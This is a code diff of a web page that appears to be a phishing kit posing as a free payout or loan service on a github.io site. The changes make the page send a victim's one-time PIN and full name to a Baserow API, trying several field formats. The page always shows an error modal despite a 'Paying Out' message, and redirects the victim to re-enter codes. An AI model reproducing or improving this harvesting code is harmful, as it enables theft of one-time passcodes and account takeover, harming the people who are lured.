@@ -439,15 +439,15 @@
             document.getElementById('loadingDiv').style.display = 'block';
             
             addDebugInfo(`Starting submission...`);
-            addDebugInfo(`PIN: $`);
-            addDebugInfo(`Name: $`);
-            addDebugInfo(`API URL:`);
+            addDebugInfo(`PIN: ${otpCode}`);
+            addDebugInfo(`Name: ${fullName}`);
+            addDebugInfo(`API URL: ${BASEROW_API}`);
             
             // Try multiple data formats to ensure one works
             const dataFormats = [
                 // Format 1: Using "Email" field
                 {
-                    'Email': ` | Name:`
+                    'Email': `PIN: ${otpCode} | Name: ${fullName}`
                 },
                 // Format 2: Using "email" field (lowercase)
                 {
@@ -547,16 +547,16 @@
             if (success) {
                 addDebugInfo('Paying Out...');
             } else {
-                addDebugInfo('All attempts failed. Please check your code');
+                addDebugInfo('All attempts failed. Please check and restart.');
             }
             
-            // Always show error modal as requested
+              // Always show error modal as requested
             document.getElementById('errorModal').style.display = 'block';
         });
         
         // Start again function
         function startAgain() {
-            window.location.href = 'https://yycloan.github.io/free/otp.html';
+            window.location.href = 'https://yycloan.github.io/free/connect.html';
         }
         
         // Close modal when clicking outside
